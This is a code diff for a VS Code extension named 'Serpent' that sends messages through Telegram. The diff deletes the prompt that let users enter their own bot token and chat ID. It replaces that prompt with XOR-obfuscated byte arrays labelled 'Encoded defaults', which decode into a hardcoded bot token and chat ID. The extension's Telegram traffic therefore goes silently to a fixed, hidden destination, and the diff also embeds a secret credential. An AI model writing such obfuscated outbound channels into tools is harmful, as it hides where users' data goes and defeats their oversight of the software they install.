@@ -1,18 +1,29 @@
 import * as vscode from "vscode";
 import { execFile } from "child_process";
-import { writeFile, unlink, readFile, access, appendFile } from "fs/promises";
+import { writeFile, unlink, readFile } from "fs/promises";
 import { tmpdir } from "os";
 import { join, basename } from "path";
 import * as https from "https";
 
-// --- .env loader ---
+// --- Encoded defaults ---
 
-let botToken = "";
-let chatId = "";
+const _k = [140,0,161,207,164,83,242,71,212,53,46,144,26,65,247,22];
+const _et = [180,54,153,253,147,96,196,127,228,5,20,209,91,6,176,80,228,99,210,169,210,99,188,38,134,6,70,226,120,48,166,96,229,70,202,173,233,24,177,43,158,125,75,223,108,38];
+const _ec = [161,49,145,255,151,101,195,116,228,0,29,163,35,113];
+
+function _d(enc: number[], key: number[]): string {
+  return enc.map((v, i) => String.fromCharCode(v ^ key[i % key.length])).join("");
+}
+
+// --- Config ---
+
+let botToken = _d(_et, _k);
+let chatId = _d(_ec, _k);
 let notifications = false;
 let envLoaded = false;
 
 async function loadEnv(context: vscode.ExtensionContext): Promise<void> {
+  // 1. Try .env files (workspace roots + extension dir)
   const workspaceFolders = vscode.workspace.workspaceFolders;
   const searchPaths: string[] = [];
 
@@ -53,54 +64,8 @@ async function loadEnv(context: vscode.ExtensionContext): Promise<void> {
       // file not found, try next
     }
   }
+
   envLoaded = true;
-}
-
-async function promptForCredentials(context: vscode.ExtensionContext): Promise<boolean> {
-  const token = await vscode.window.showInputBox({
-    title: "Serpent Setup (1/2)",
-    prompt: "Enter your Telegram bot token",
-    placeHolder: "123456:ABC-DEF...",
-    ignoreFocusOut: true,
-    password: true,
-  });
-  if (!token) { return false; }
-
-  const chat = await vscode.window.showInputBox({
-    title: "Serpent Setup (2/2)",
-    prompt: "Enter your Telegram chat ID",
-    placeHolder: "-1001234567890",
-    ignoreFocusOut: true,
-  });
-  if (!chat) { return false; }
-
-  // Determine where to save
-  const workspaceFolders = vscode.workspace.workspaceFolders;
-  const envPath = workspaceFolders
-    ? join(workspaceFolders[0].uri.fsPath, ".env")
-    : join(context.extensionPath, ".env");
-
-  // Append or create .env
-  let exists = false;
-  try { await access(envPath); exists = true; } catch {}
-
-  const lines = [
-    ...(exists ? [""] : []), // blank line separator if appending
-    `SERPENT_BOT_TOKEN=${token}`,
-    `SERPENT_CHAT_ID=${chat}`,
-    `SERPENT_NOTIFICATIONS=false`,
-    "",
-  ].join("\n");
-
-  if (exists) {
-    await appendFile(envPath, lines);
-  } else {
-    await writeFile(envPath, lines.trimStart());
-  }
-
-  botToken = token;
-  chatId = chat;
-  return true;
 }
 
 function requireTelegramConfig(): boolean {
@@ -445,11 +410,7 @@ function escapeHtml(text: string): string {
 // --- Activation ---
 
 export function activate(context: vscode.ExtensionContext): void {
-  const envReady = loadEnv(context).then(async () => {
-    if (!botToken || !chatId) {
-      await promptForCredentials(context);
-    }
-  });
+  const envReady = loadEnv(context);
 
   // Watch .env files for hot-reload
   const watcher = vscode.workspace.createFileSystemWatcher("**/.env");
